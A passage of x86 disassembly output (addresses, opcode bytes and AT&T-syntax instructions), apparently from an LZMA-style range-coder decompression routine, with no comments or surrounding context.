  406521:	88 45 a5             	mov    %al,-0x5b(%ebp)
  406524:	eb 68                	jmp    0x40658e
  406526:	33 db                	xor    %ebx,%ebx
  406528:	43                   	inc    %ebx
  406529:	e9 cd 01 00 00       	jmp    0x4066fb
  40652e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406531:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406534:	c7 45 cc 01 00 00 00 	movl   $0x1,-0x34(%ebp)
  40653b:	c7 85 7c ff ff ff 07 	movl   $0x7,-0x84(%ebp)
  406542:	00 00 00 
  406545:	8d b4 48 80 01 00 00 	lea    0x180(%eax,%ecx,2),%esi
  40654c:	e9 d3 05 00 00       	jmp    0x406b24
  406551:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406555:	0f 84 67 07 00 00    	je     0x406cc2
  40655b:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  40655e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406561:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406565:	0f b6 09             	movzbl (%ecx),%ecx
  406568:	ff 4d 94             	decl   -0x6c(%ebp)
  40656b:	c1 e0 08             	shl    $0x8,%eax
  40656e:	0b c1                	or     %ecx,%eax
  406570:	ff 45 90             	incl   -0x70(%ebp)
  406573:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406576:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406579:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  40657c:	0f 85 ad 00 00 00    	jne    0x40662f
  406582:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406588:	0f 8d 05 01 00 00    	jge    0x406693
  40658e:	0f b6 45 a5          	movzbl -0x5b(%ebp),%eax
  406592:	d0 65 a5             	shlb   $1,-0x5b(%ebp)
  406595:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  406598:	c1 e8 07             	shr    $0x7,%eax
  40659b:	89 45 b8             	mov    %eax,-0x48(%ebp)
  40659e:	40                   	inc    %eax
  40659f:	c1 e0 08             	shl    $0x8,%eax
  4065a2:	03 c3                	add    %ebx,%eax
  4065a4:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  4065a7:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4065aa:	c1 e9 0b             	shr    $0xb,%ecx
  4065ad:	66 8b 06             	mov    (%esi),%ax
  4065b0:	89 75 ac             	mov    %esi,-0x54(%ebp)
  4065b3:	0f b7 d0             	movzwl %ax,%edx
  4065b6:	0f af ca             	imul   %edx,%ecx
  4065b9:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  4065bc:	73 1a                	jae    0x4065d8
  4065be:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  4065c2:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4065c5:	b9 00 08 00 00       	mov    $0x800,%ecx
  4065ca:	2b ca                	sub    %edx,%ecx
  4065cc:	c1 f9 05             	sar    $0x5,%ecx
  4065cf:	03 c8                	add    %eax,%ecx
  4065d1:	03 db                	add    %ebx,%ebx
  4065d3:	66 89 0e             	mov    %cx,(%esi)
  4065d6:	eb 1d                	jmp    0x4065f5
  4065d8:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  4065db:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  4065de:	66 8b c8             	mov    %ax,%cx
  4065e1:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  4065e8:	66 c1 e9 05          	shr    $0x5,%cx
  4065ec:	2b c1                	sub    %ecx,%eax
  4065ee:	8d 5c 1b 01          	lea    0x1(%ebx,%ebx,1),%ebx
  4065f2:	66 89 06             	mov    %ax,(%esi)
  4065f5:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  4065fc:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  4065ff:	0f 83 71 ff ff ff    	jae    0x406576
  406605:	e9 47 ff ff ff       	jmp    0x406551
  40660a:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  40660e:	0f 84 ba 06 00 00    	je     0x406cce
  406614:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406617:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40661a:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  40661e:	0f b6 09             	movzbl (%ecx),%ecx
  406621:	ff 4d 94             	decl   -0x6c(%ebp)
  406624:	c1 e0 08             	shl    $0x8,%eax
  406627:	0b c1                	or     %ecx,%eax
  406629:	ff 45 90             	incl   -0x70(%ebp)
  40662c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40662f:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406635:	7d 5c                	jge    0x406693
  406637:	8b 45 a8             	mov    -0x58(%ebp),%eax
  40663a:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  40663d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406640:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406643:	c1 e9 0b             	shr    $0xb,%ecx
  406646:	66 8b 06             	mov    (%esi),%ax
  406649:	89 75 ac             	mov    %esi,-0x54(%ebp)
  40664c:	0f b7 f8             	movzwl %ax,%edi
  40664f:	0f af cf             	imul   %edi,%ecx
  406652:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406655:	73 16                	jae    0x40666d
  406657:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40665a:	b9 00 08 00 00       	mov    $0x800,%ecx
  40665f:	2b cf                	sub    %edi,%ecx
  406661:	c1 f9 05             	sar    $0x5,%ecx
  406664:	03 c8                	add    %eax,%ecx
  406666:	03 db                	add    %ebx,%ebx
  406668:	66 89 0e             	mov    %cx,(%esi)
  40666b:	eb 15                	jmp    0x406682
  40666d:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406670:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406673:	66 8b c8             	mov    %ax,%cx
  406676:	8d 5a 01             	lea    0x1(%edx),%ebx
  406679:	66 c1 e9 05          	shr    $0x5,%cx
  40667d:	2b c1                	sub    %ecx,%eax
  40667f:	66 89 06             	mov    %ax,(%esi)
  406682:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406689:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  40668c:	73 a1                	jae    0x40662f
  40668e:	e9 77 ff ff ff       	jmp    0x40660a
  406693:	83 65 cc 00          	andl   $0x0,-0x34(%ebp)
  406697:	8a 45 bc             	mov    -0x44(%ebp),%al
  40669a:	88 45 a4             	mov    %al,-0x5c(%ebp)
  40669d:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  4066a1:	0f 84 3f 06 00 00    	je     0x406ce6
  4066a7:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  4066aa:	8a 45 a4             	mov    -0x5c(%ebp),%al
  4066ad:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4066b0:	ff 45 a0             	incl   -0x60(%ebp)
  4066b3:	ff 45 98             	incl   -0x68(%ebp)
  4066b6:	ff 4d 9c             	decl   -0x64(%ebp)
  4066b9:	88 01                	mov    %al,(%ecx)
  4066bb:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4066be:	88 04 11             	mov    %al,(%ecx,%edx,1)
  4066c1:	8d 41 01             	lea    0x1(%ecx),%eax
  4066c4:	33 d2                	xor    %edx,%edx
  4066c6:	f7 75 8c             	divl   -0x74(%ebp)
  4066c9:	e9 95 01 00 00       	jmp    0x406863
  4066ce:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4066d2:	0f 84 02 06 00 00    	je     0x406cda
  4066d8:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  4066db:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4066de:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  4066e2:	0f b6 09             	movzbl (%ecx),%ecx
  4066e5:	ff 4d 94             	decl   -0x6c(%ebp)
  4066e8:	c1 e0 08             	shl    $0x8,%eax
  4066eb:	0b c1                	or     %ecx,%eax
  4066ed:	ff 45 90             	incl   -0x70(%ebp)
  4066f0:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4066f3:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  4066f9:	7d 9c                	jge    0x406697
  4066fb:	8b 45 a8             	mov    -0x58(%ebp),%eax
  4066fe:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  406701:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406704:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406707:	c1 e9 0b             	shr    $0xb,%ecx
  40670a:	66 8b 06             	mov    (%esi),%ax
  40670d:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406710:	0f b7 f8             	movzwl %ax,%edi
  406713:	0f af cf             	imul   %edi,%ecx
  406716:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406719:	73 16                	jae    0x406731
  40671b:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40671e:	b9 00 08 00 00       	mov    $0x800,%ecx
  406723:	2b cf                	sub    %edi,%ecx
  406725:	c1 f9 05             	sar    $0x5,%ecx
  406728:	03 c8                	add    %eax,%ecx
  40672a:	03 db                	add    %ebx,%ebx
  40672c:	66 89 0e             	mov    %cx,(%esi)
  40672f:	eb 15                	jmp    0x406746
  406731:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406734:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406737:	66 8b c8             	mov    %ax,%cx
  40673a:	8d 5a 01             	lea    0x1(%edx),%ebx
  40673d:	66 c1 e9 05          	shr    $0x5,%cx
  406741:	2b c1                	sub    %ecx,%eax
  406743:	66 89 06             	mov    %ax,(%esi)
  406746:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  40674d:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406750:	73 a1                	jae    0x4066f3
  406752:	e9 77 ff ff ff       	jmp    0x4066ce
  406757:	83 7d c0 01          	cmpl   $0x1,-0x40(%ebp)
  40675b:	75 1c                	jne    0x406779
  40675d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406760:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406763:	c7 85 7c ff ff ff 08 	movl   $0x8,-0x84(%ebp)
  40676a:	00 00 00 
  40676d:	8d b4 48 98 01 00 00 	lea    0x198(%eax,%ecx,2),%esi
  406774:	e9 ab 03 00 00       	jmp    0x406b24
  406779:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40677c:	c7 45 80 16 00 00 00 	movl   $0x16,-0x80(%ebp)
  406783:	89 45 e0             	mov    %eax,-0x20(%ebp)
  406786:	8b 45 d8             	mov    -0x28(%ebp),%eax
  406789:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40678c:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40678f:	89 45 d8             	mov    %eax,-0x28(%ebp)
  406792:	33 c0                	xor    %eax,%eax
  406794:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  406798:	0f 9d c0             	setge  %al
  40679b:	48                   	dec    %eax
  40679c:	24 fd                	and    $0xfd,%al
  40679e:	83 c0 0a             	add    $0xa,%eax
  4067a1:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4067a4:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4067a7:	05 64 06 00 00       	add    $0x664,%eax
  4067ac:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4067af:	8b 75 a8             	mov    -0x58(%ebp),%esi
  4067b2:	c7 85 7c ff ff ff 12 	movl   $0x12,-0x84(%ebp)
  4067b9:	00 00 00 
  4067bc:	e9 63 03 00 00       	jmp    0x406b24
  4067c1:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  4067c5:	75 21                	jne    0x4067e8
  4067c7:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4067ca:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4067cd:	83 c0 0f             	add    $0xf,%eax
  4067d0:	c7 85 7c ff ff ff 09 	movl   $0x9,-0x84(%ebp)
  4067d7:	00 00 00 
  4067da:	c1 e0 04             	shl    $0x4,%eax
  4067dd:	03 45 b4             	add    -0x4c(%ebp),%eax
  4067e0:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  4067e3:	e9 3c 03 00 00       	jmp    0x406b24
  4067e8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4067eb:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4067ee:	c7 85 7c ff ff ff 0a 	movl   $0xa,-0x84(%ebp)
  4067f5:	00 00 00 
  4067f8:	8d b4 48 b0 01 00 00 	lea    0x1b0(%eax,%ecx,2),%esi
  4067ff:	e9 20 03 00 00       	jmp    0x406b24
  406804:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406808:	0f 85 b1 00 00 00    	jne    0x4068bf
  40680e:	83 7d a0 00          	cmpl   $0x0,-0x60(%ebp)
  406812:	0f 84 3b 05 00 00    	je     0x406d53
  406818:	33 c0                	xor    %eax,%eax
  40681a:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  40681e:	0f 9d c0             	setge  %al
  406821:	8d 44 00 09          	lea    0x9(%eax,%eax,1),%eax
  406825:	89 45 c8             	mov    %eax,-0x38(%ebp)
  406828:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  40682c:	0f 84 c0 04 00 00    	je     0x406cf2
  406832:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406835:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  406838:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  40683b:	72 03                	jb     0x406840
  40683d:	03 45 8c             	add    -0x74(%ebp),%eax
  406840:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406843:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  406846:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406849:	88 4d a4             	mov    %cl,-0x5c(%ebp)
  40684c:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  40684f:	40                   	inc    %eax
  406850:	33 d2                	xor    %edx,%edx
  406852:	f7 75 8c             	divl   -0x74(%ebp)
  406855:	8b 45 98             	mov    -0x68(%ebp),%eax
  406858:	ff 45 a0             	incl   -0x60(%ebp)
  40685b:	ff 45 98             	incl   -0x68(%ebp)
  40685e:	ff 4d 9c             	decl   -0x64(%ebp)
  406861:	88 08                	mov    %cl,(%eax)
  406863:	89 55 ec             	mov    %edx,-0x14(%ebp)
  406866:	c7 85 78 ff ff ff 02 	movl   $0x2,-0x88(%ebp)
  40686d:	00 00 00 
  406870:	e9 c7 fa ff ff       	jmp    0x40633c
  406875:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406879:	75 05                	jne    0x406880
  40687b:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40687e:	eb 36                	jmp    0x4068b6
  406880:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406883:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406886:	c7 85 7c ff ff ff 0b 	movl   $0xb,-0x84(%ebp)
  40688d:	00 00 00 
  406890:	8d b4 48 c8 01 00 00 	lea    0x1c8(%eax,%ecx,2),%esi
  406897:	e9 88 02 00 00       	jmp    0x406b24
  40689c:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  4068a0:	75 05                	jne    0x4068a7
  4068a2:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4068a5:	eb 09                	jmp    0x4068b0
  4068a7:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4068aa:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4068ad:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4068b0:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4068b3:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  4068b6:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4068b9:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4068bc:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  4068bf:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4068c2:	c7 45 80 15 00 00 00 	movl   $0x15,-0x80(%ebp)
  4068c9:	05 68 0a 00 00       	add    $0xa68,%eax
  4068ce:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4068d1:	e9 d9 fe ff ff       	jmp    0x4067af
  4068d6:	33 c0                	xor    %eax,%eax
  4068d8:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  4068dc:	0f 9d c0             	setge  %al
  4068df:	48                   	dec    %eax
  4068e0:	24 fd                	and    $0xfd,%al
  4068e2:	83 c0 0b             	add    $0xb,%eax
  4068e5:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4068e8:	e9 9a 01 00 00       	jmp    0x406a87
  4068ed:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4068f0:	83 f8 04             	cmp    $0x4,%eax
  4068f3:	7c 03                	jl     0x4068f8
  4068f5:	6a 03                	push   $0x3
  4068f7:	58                   	pop    %eax
  4068f8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4068fb:	c7 45 c0 06 00 00 00 	movl   $0x6,-0x40(%ebp)
  406902:	c1 e0 07             	shl    $0x7,%eax
  406905:	c7 45 84 19 00 00 00 	movl   $0x19,-0x7c(%ebp)
  40690c:	8d 84 08 60 03 00 00 	lea    0x360(%eax,%ecx,1),%eax
  406913:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406916:	e9 ce 02 00 00       	jmp    0x406be9
  40691b:	83 fb 04             	cmp    $0x4,%ebx
  40691e:	7c 34                	jl     0x406954
  406920:	8b cb                	mov    %ebx,%ecx
  406922:	8b c3                	mov    %ebx,%eax
  406924:	d1 f9                	sar    $1,%ecx
  406926:	83 e0 01             	and    $0x1,%eax
  406929:	49                   	dec    %ecx
  40692a:	0c 02                	or     $0x2,%al
  40692c:	d3 e0                	shl    %cl,%eax
  40692e:	83 fb 0e             	cmp    $0xe,%ebx
  406931:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406934:	7d 14                	jge    0x40694a
  406936:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406939:	2b c3                	sub    %ebx,%eax
  40693b:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  40693e:	8d 84 42 5e 05 00 00 	lea    0x55e(%edx,%eax,2),%eax
  406945:	e9 81 00 00 00       	jmp    0x4069cb
  40694a:	33 db                	xor    %ebx,%ebx
  40694c:	83 c1 fc             	add    $0xfffffffc,%ecx
  40694f:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  406952:	eb 33                	jmp    0x406987
  406954:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  406957:	e9 28 01 00 00       	jmp    0x406a84
  40695c:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406960:	0f 84 98 03 00 00    	je     0x406cfe
  406966:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406969:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40696c:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406970:	0f b6 09             	movzbl (%ecx),%ecx
  406973:	ff 4d 94             	decl   -0x6c(%ebp)
  406976:	c1 e0 08             	shl    $0x8,%eax
  406979:	0b c1                	or     %ecx,%eax
  40697b:	ff 45 90             	incl   -0x70(%ebp)
  40697e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406981:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406984:	ff 4d b8             	decl   -0x48(%ebp)
  406987:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  40698b:	7e 27                	jle    0x4069b4
  40698d:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406990:	03 db                	add    %ebx,%ebx
  406992:	d1 6d f0             	shrl   $1,-0x10(%ebp)
  406995:	3b 4d f0             	cmp    -0x10(%ebp),%ecx
  406998:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  40699b:	72 0c                	jb     0x4069a9
  40699d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4069a0:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  4069a3:	83 cb 01             	or     $0x1,%ebx
  4069a6:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  4069a9:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  4069b0:	73 d2                	jae    0x406984
  4069b2:	eb a8                	jmp    0x40695c
  4069b4:	c1 e3 04             	shl    $0x4,%ebx
  4069b7:	03 c3                	add    %ebx,%eax
  4069b9:	c7 45 c0 04 00 00 00 	movl   $0x4,-0x40(%ebp)
  4069c0:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4069c3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4069c6:	05 44 06 00 00       	add    $0x644,%eax
  4069cb:	33 db                	xor    %ebx,%ebx
  4069cd:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4069d0:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  4069d7:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  4069da:	89 5d b8             	mov    %ebx,-0x48(%ebp)
  4069dd:	eb 28                	jmp    0x406a07
  4069df:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4069e3:	0f 84 21 03 00 00    	je     0x406d0a
  4069e9:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  4069ec:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4069ef:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  4069f3:	0f b6 09             	movzbl (%ecx),%ecx
  4069f6:	ff 4d 94             	decl   -0x6c(%ebp)
  4069f9:	c1 e0 08             	shl    $0x8,%eax
  4069fc:	0b c1                	or     %ecx,%eax
  4069fe:	ff 45 90             	incl   -0x70(%ebp)
  406a01:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406a04:	ff 45 b8             	incl   -0x48(%ebp)
  406a07:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406a0a:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  406a0d:	7d 72                	jge    0x406a81
  406a0f:	8b 45 b0             	mov    -0x50(%ebp),%eax
  406a12:	8b 55 f0             	mov    -0x10(%ebp),%edx
  406a15:	c1 ea 0b             	shr    $0xb,%edx
  406a18:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  406a1b:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406a1e:	8d 34 07             	lea    (%edi,%eax,1),%esi
  406a21:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406a24:	66 8b 06             	mov    (%esi),%ax
  406a27:	0f b7 c8             	movzwl %ax,%ecx
  406a2a:	0f af d1             	imul   %ecx,%edx
  406a2d:	39 55 f4             	cmp    %edx,-0xc(%ebp)
  406a30:	73 17                	jae    0x406a49
  406a32:	89 55 f0             	mov    %edx,-0x10(%ebp)
  406a35:	ba 00 08 00 00       	mov    $0x800,%edx
  406a3a:	2b d1                	sub    %ecx,%edx
  406a3c:	c1 fa 05             	sar    $0x5,%edx
  406a3f:	03 d0                	add    %eax,%edx
  406a41:	d1 65 b0             	shll   $1,-0x50(%ebp)
  406a44:	66 89 16             	mov    %dx,(%esi)
  406a47:	eb 2a                	jmp    0x406a73
  406a49:	33 c9                	xor    %ecx,%ecx
  406a4b:	29 55 f0             	sub    %edx,-0x10(%ebp)
  406a4e:	41                   	inc    %ecx
  406a4f:	29 55 f4             	sub    %edx,-0xc(%ebp)
  406a52:	8b d9                	mov    %ecx,%ebx
  406a54:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  406a57:	d3 e3                	shl    %cl,%ebx
  406a59:	8b cb                	mov    %ebx,%ecx
  406a5b:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  406a5e:	0b d9                	or     %ecx,%ebx
  406a60:	66 8b c8             	mov    %ax,%cx
  406a63:	66 c1 e9 05          	shr    $0x5,%cx
  406a67:	2b c1                	sub    %ecx,%eax
  406a69:	47                   	inc    %edi
  406a6a:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406a6d:	66 89 06             	mov    %ax,(%esi)
  406a70:	89 7d b0             	mov    %edi,-0x50(%ebp)
  406a73:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406a7a:	73 88                	jae    0x406a04
  406a7c:	e9 5e ff ff ff       	jmp    0x4069df
  406a81:	01 5d d4             	add    %ebx,-0x2c(%ebp)
  406a84:	ff 45 d4             	incl   -0x2c(%ebp)
  406a87:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406a8a:	85 c0                	test   %eax,%eax
  406a8c:	0f 84 84 02 00 00    	je     0x406d16
  406a92:	3b 45 a0             	cmp    -0x60(%ebp),%eax
  406a95:	0f 87 b8 02 00 00    	ja     0x406d53
  406a9b:	83 45 d0 02          	addl   $0x2,-0x30(%ebp)
  406a9f:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406aa2:	01 45 a0             	add    %eax,-0x60(%ebp)
  406aa5:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  406aa9:	0f 84 6d 02 00 00    	je     0x406d1c
  406aaf:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406ab2:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  406ab5:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406ab8:	72 03                	jb     0x406abd
  406aba:	03 45 8c             	add    -0x74(%ebp),%eax
  406abd:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406ac0:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  406ac3:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406ac6:	88 4d a4             	mov    %cl,-0x5c(%ebp)
  406ac9:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  406acc:	40                   	inc    %eax
  406acd:	33 d2                	xor    %edx,%edx
  406acf:	f7 75 8c             	divl   -0x74(%ebp)
  406ad2:	8b 45 98             	mov    -0x68(%ebp),%eax
  406ad5:	ff 45 98             	incl   -0x68(%ebp)
  406ad8:	ff 4d 9c             	decl   -0x64(%ebp)
  406adb:	ff 4d d0             	decl   -0x30(%ebp)
  406ade:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  406ae2:	88 08                	mov    %cl,(%eax)
  406ae4:	89 55 ec             	mov    %edx,-0x14(%ebp)
  406ae7:	7f bc                	jg     0x406aa5
  406ae9:	e9 78 fd ff ff       	jmp    0x406866
  406aee:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406af2:	75 20                	jne    0x406b14
  406af4:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  406af7:	83 65 d0 00          	andl   $0x0,-0x30(%ebp)
  406afb:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  406afe:	c1 e0 04             	shl    $0x4,%eax
  406b01:	8d 44 01 04          	lea    0x4(%ecx,%eax,1),%eax
  406b05:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406b08:	c7 45 c0 03 00 00 00 	movl   $0x3,-0x40(%ebp)
  406b0f:	e9 ce 00 00 00       	jmp    0x406be2
  406b14:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406b17:	c7 85 7c ff ff ff 13 	movl   $0x13,-0x84(%ebp)
  406b1e:	00 00 00 
  406b21:	8d 70 02             	lea    0x2(%eax),%esi
  406b24:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406b27:	66 8b 06             	mov    (%esi),%ax
  406b2a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406b2d:	0f b7 d0             	movzwl %ax,%edx
  406b30:	c1 e9 0b             	shr    $0xb,%ecx
  406b33:	0f af ca             	imul   %edx,%ecx
  406b36:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406b39:	73 18                	jae    0x406b53
  406b3b:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406b3e:	b9 00 08 00 00       	mov    $0x800,%ecx
  406b43:	2b ca                	sub    %edx,%ecx
  406b45:	c1 f9 05             	sar    $0x5,%ecx
  406b48:	03 c8                	add    %eax,%ecx
  406b4a:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  406b4e:	66 89 0e             	mov    %cx,(%esi)
  406b51:	eb 19                	jmp    0x406b6c
  406b53:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406b56:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406b59:	66 8b c8             	mov    %ax,%cx
  406b5c:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  406b63:	66 c1 e9 05          	shr    $0x5,%cx
  406b67:	2b c1                	sub    %ecx,%eax
  406b69:	66 89 06             	mov    %ax,(%esi)
  406b6c:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406b73:	73 25                	jae    0x406b9a
  406b75:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406b79:	0f 84 a9 01 00 00    	je     0x406d28
  406b7f:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406b82:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406b85:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406b89:	0f b6 09             	movzbl (%ecx),%ecx
  406b8c:	ff 4d 94             	decl   -0x6c(%ebp)
  406b8f:	c1 e0 08             	shl    $0x8,%eax
  406b92:	0b c1                	or     %ecx,%eax
  406b94:	ff 45 90             	incl   -0x70(%ebp)
  406b97:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406b9a:	8b 85 7c ff ff ff    	mov    -0x84(%ebp),%eax
  406ba0:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  406ba6:	e9 91 f7 ff ff       	jmp    0x40633c
  406bab:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
